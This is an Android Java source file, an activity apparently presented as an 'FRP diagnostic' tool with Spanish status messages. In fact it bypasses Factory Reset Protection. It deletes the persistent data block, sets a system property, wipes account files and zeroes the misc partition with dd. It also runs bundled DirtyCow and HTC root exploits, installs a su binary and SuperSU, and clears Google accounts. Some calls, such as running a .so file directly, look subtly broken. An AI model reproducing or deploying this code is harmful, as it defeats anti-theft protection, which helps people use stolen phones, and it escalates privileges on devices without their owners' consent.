package com.example.frpdiagnostic;

import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;

public class RootFRPActivity extends Activity {
    
    private TextView tvRootStatus;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_root_frp);
        
        tvRootStatus = findViewById(R.id.tvRootStatus);
        Button btnBypassFRP = findViewById(R.id.btnBypassFRP);
        Button btnRootDevice = findViewById(R.id.btnRootDevice);
        Button btnInstallSuperSU = findViewById(R.id.btnInstallSuperSU);
        Button btnRemoveAccounts = findViewById(R.id.btnRemoveAccounts);
        
        btnBypassFRP.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                bypassFRP();
            }
        });
        
        btnRootDevice.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                rootDevice();
            }
        });
        
        btnInstallSuperSU.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                installSuperSU();
            }
        });
        
        btnRemoveAccounts.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                removeGoogleAccounts();
            }
        });
    }
    
    private void bypassFRP() {
        tvRootStatus.setText("Bypassing FRP...");
        
        new AsyncTask<Void, String, Boolean>() {
            @Override
            protected Boolean doInBackground(Void... params) {
                publishProgress("Iniciando bypass de FRP...");
                
                try {
                    // 1. Eliminar archivo de persistencia FRP
                    publishProgress("Eliminando archivo de persistencia FRP...");
                    executeCommand("rm -f /persist/frp/persistent_data_block.bin");
                    
                    // 2. Modificar propiedades del sistema
                    publishProgress("Modificando propiedades del sistema...");
                    executeCommand("setprop ro.frp.pst 0");
                    
                    // 3. Eliminar datos de cuenta Google
                    publishProgress("Eliminando datos de cuenta Google...");
                    executeCommand("rm -rf /data/system/users/0/accounts*");
                    
                    // 4. Modificar partición misc
                    publishProgress("Modificando partición misc...");
                    executeCommand("dd if=/dev/zero of=/dev/block/bootdevice/by-name/misc bs=256 count=1");
                    
                    return true;
                } catch (Exception e) {
                    e.printStackTrace();
                    publishProgress("Error: " + e.getMessage());
                    return false;
                }
            }
            
            @Override
            protected void onProgressUpdate(String... values) {
                tvRootStatus.setText(values[0]);
            }
            
            @Override
            protected void onPostExecute(Boolean success) {
                if (success) {
                    tvRootStatus.setText("FRP Bypass: Completado con éxito\n" +
                            "Reinicia el dispositivo para aplicar los cambios");
                } else {
                    tvRootStatus.setText("FRP Bypass: Error\n" +
                            "Verifica que el dispositivo tenga root");
                }
            }
        }.execute();
    }
    
    private void rootDevice() {
        tvRootStatus.setText("Rooting device...");
        
        new AsyncTask<Void, String, Boolean>() {
            @Override
            protected Boolean doInBackground(Void... params) {
                publishProgress("Iniciando proceso de root...");
                
                try {
                    // 1. Extraer bibliotecas nativas
                    publishProgress("Extrayendo bibliotecas nativas...");
                    extractAsset("libdirtycow.so", getFilesDir() + "/libdirtycow.so");
                    extractAsset("libhtcexploit.so", getFilesDir() + "/libhtcexploit.so");
                    
                    // 2. Dar permisos de ejecución
                    publishProgress("Configurando permisos...");
                    executeCommand("chmod 755 " + getFilesDir() + "/libdirtycow.so");
                    executeCommand("chmod 755 " + getFilesDir() + "/libhtcexploit.so");
                    
                    // 3. Ejecutar exploit DirtyCow
                    publishProgress("Ejecutando exploit DirtyCow...");
                    String result = executeCommand("LD_LIBRARY_PATH=" + getFilesDir() + " " + 
                            getFilesDir() + "/libdirtycow.so /system/bin/sh");
                    
                    // 4. Verificar si tenemos root
                    publishProgress("Verificando acceso root...");
                    String testRoot = executeCommand("id");
                    boolean hasRoot = testRoot.contains("uid=0") || testRoot.contains("root");
                    
                    if (!hasRoot) {
                        // 5. Intentar con exploit HTC específico
                        publishProgress("Intentando exploit HTC específico...");
                        executeCommand("LD_LIBRARY_PATH=" + getFilesDir() + " " + 
                                getFilesDir() + "/libhtcexploit.so");
                        
                        // Verificar nuevamente
                        testRoot = executeCommand("id");
                        hasRoot = testRoot.contains("uid=0") || testRoot.contains("root");
                    }
                    
                    return hasRoot;
                } catch (Exception e) {
                    e.printStackTrace();
                    publishProgress("Error: " + e.getMessage());
                    return false;
                }
            }
            
            @Override
            protected void onProgressUpdate(String... values) {
                tvRootStatus.setText(values[0]);
            }
            
            @Override
            protected void onPostExecute(Boolean success) {
                if (success) {
                    tvRootStatus.setText("Root: Completado con éxito\n" +
                            "El dispositivo ahora tiene acceso root");
                } else {
                    tvRootStatus.setText("Root: Error\n" +
                            "No se pudo obtener acceso root");
                }
            }
        }.execute();
    }
    
    private void installSuperSU() {
        tvRootStatus.setText("Installing SuperSU...");
        
        new AsyncTask<Void, String, Boolean>() {
            @Override
            protected Boolean doInBackground(Void... params) {
                publishProgress("Iniciando instalación de SuperSU...");
                
                try {
                    // 1. Verificar si tenemos root
                    publishProgress("Verificando acceso root...");
                    String testRoot = executeCommand("id");
                    boolean hasRoot = testRoot.contains("uid=0") || testRoot.contains("root");
                    
                    if (!hasRoot) {
                        publishProgress("No se detectó acceso root. Obteniendo root primero...");
                        // Intentar obtener root primero
                        extractAsset("libdirtycow.so", getFilesDir() + "/libdirtycow.so");
                        executeCommand("chmod 755 " + getFilesDir() + "/libdirtycow.so");
                        executeCommand("LD_LIBRARY_PATH=" + getFilesDir() + " " + 
                                getFilesDir() + "/libdirtycow.so /system/bin/sh");
                        
                        // Verificar nuevamente
                        testRoot = executeCommand("id");
                        hasRoot = testRoot.contains("uid=0") || testRoot.contains("root");
                        
                        if (!hasRoot) {
                            return false;
                        }
                    }
                    
                    // 2. Extraer SuperSU APK
                    publishProgress("Extrayendo SuperSU APK...");
                    extractAsset("SuperSU.apk", getFilesDir() + "/SuperSU.apk");
                    
                    // 3. Extraer binario su
                    publishProgress("Extrayendo binario su...");
                    extractAsset("su", getFilesDir() + "/su");
                    executeCommand("chmod 755 " + getFilesDir() + "/su");
                    
                    // 4. Montar /system como lectura-escritura
                    publishProgress("Montando /system como lectura-escritura...");
                    executeCommand("mount -o rw,remount /system");
                    
                    // 5. Copiar binario su a /system/xbin/
                    publishProgress("Instalando binario su...");
                    executeCommand("cp " + getFilesDir() + "/su /system/xbin/su");
                    executeCommand("chmod 755 /system/xbin/su");
                    executeCommand("chown 0:0 /system/xbin/su");
                    
                    // 6. Instalar SuperSU APK
                    publishProgress("Instalando SuperSU APK...");
                    executeCommand("pm install -r " + getFilesDir() + "/SuperSU.apk");
                    
                    // 7. Configurar SuperSU
                    publishProgress("Configurando SuperSU...");
                    executeCommand("su --install");
                    executeCommand("su --daemon&");
                    
                    return true;
                } catch (Exception e) {
                    e.printStackTrace();
                    publishProgress("Error: " + e.getMessage());
                    return false;
                }
            }
            
            @Override
            protected void onProgressUpdate(String... values) {
                tvRootStatus.setText(values[0]);
            }
            
            @Override
            protected void onPostExecute(Boolean success) {
                if (success) {
                    tvRootStatus.setText("SuperSU: Instalado con éxito\n" +
                            "Reinicia el dispositivo para completar la instalación");
                } else {
                    tvRootStatus.setText("SuperSU: Error en la instalación\n" +
                            "Verifica que el dispositivo tenga root");
                }
            }
        }.execute();
    }
    
    private void removeGoogleAccounts() {
        tvRootStatus.setText("Removing Google Accounts...");
        
        new AsyncTask<Void, String, Boolean>() {
            @Override
            protected Boolean doInBackground(Void... params) {
                publishProgress("Iniciando eliminación de cuentas Google...");
                
                try {
                    // 1. Verificar si tenemos root
                    publishProgress("Verificando acceso root...");
                    String testRoot = executeCommand("id");
                    boolean hasRoot = testRoot.contains("uid=0") || testRoot.contains("root");
                    
                    if (!hasRoot) {
                        publishProgress("No se detectó acceso root. Se requiere root para esta operación.");
                        return false;
                    }
                    
                    // 2. Listar cuentas Google
                    publishProgress("Identificando cuentas Google...");
                    AccountManager am = AccountManager.get(RootFRPActivity.this);
                    Account[] accounts = am.getAccounts();
                    boolean hasGoogleAccount = false;
                    
                    for (Account account : accounts) {
                        if (account.type.equals("com.google")) {
                            hasGoogleAccount = true;
                            publishProgress("Eliminando cuenta: " + account.name);
                            
                            // 3. Eliminar cuenta mediante comandos root
                            executeCommand("pm clear com.google.android.gsf");
                            executeCommand("pm clear com.google.android.gms");
                            executeCommand("rm -rf /data/system/users/0/accounts*");
                            executeCommand("rm -rf /data/data/com.google.android.gsf");
                            executeCommand("rm -rf /data/data/com.google.android.gsf.login");
                        }
                    }
                    
                    if (!hasGoogleAccount) {
                        publishProgress("No se encontraron cuentas Google");
                    }
                    
                    // 4. Eliminar datos residuales de FRP
                    publishProgress("Eliminando datos residuales de FRP...");
                    executeCommand("rm -f /persist/frp/persistent_data_block.bin");
                    executeCommand("setprop ro.frp.pst 0");
                    
                    return true;
                } catch (Exception e) {
                    e.printStackTrace();
                    publishProgress("Error: " + e.getMessage());
                    return false;
                }
            }
            
            @Override
            protected void onProgressUpdate(String... values) {
                tvRootStatus.setText(values[0]);
            }
            
            @Override
            protected void onPostExecute(Boolean success) {
                if (success) {
                    tvRootStatus.setText("Cuentas Google: Eliminadas con éxito\n" +
                            "Reinicia el dispositivo para aplicar los cambios");
                } else {
                    tvRootStatus.setText("Cuentas Google: Error en la eliminación\n" +
                            "Verifica que el dispositivo tenga root");
                }
            }
        }.execute();
    }
    
    private String executeCommand(String command) {
        try {
            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());
            os.writeBytes(command + "\n");
            os.writeBytes("exit\n");
            os.flush();
            
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            
            process.waitFor();
            return output.toString().trim();
        } catch (Exception e) {
            e.printStackTrace();
            return "Error executing command: " + e.getMessage();
        }
    }
    
    private void extractAsset(String assetName, String outputPath) throws IOException {
        InputStream in = null;
        OutputStream out = null;
        try {
            in = getAssets().open(assetName);
            out = new FileOutputStream(outputPath);
            byte[] buffer = new byte[1024];
            int read;
            while ((read = in.read(buffer)) != -1) {
                out.write(buffer, 0, read);
            }
        } finally {
            if (in != null) {
                try {
                    in.close();
                } catch (IOException e) {
                    // Ignorar
                }
            }
            if (out != null) {
                try {
                    out.close();
                } catch (IOException e) {
                    // Ignorar
                }
            }
        }
    }
}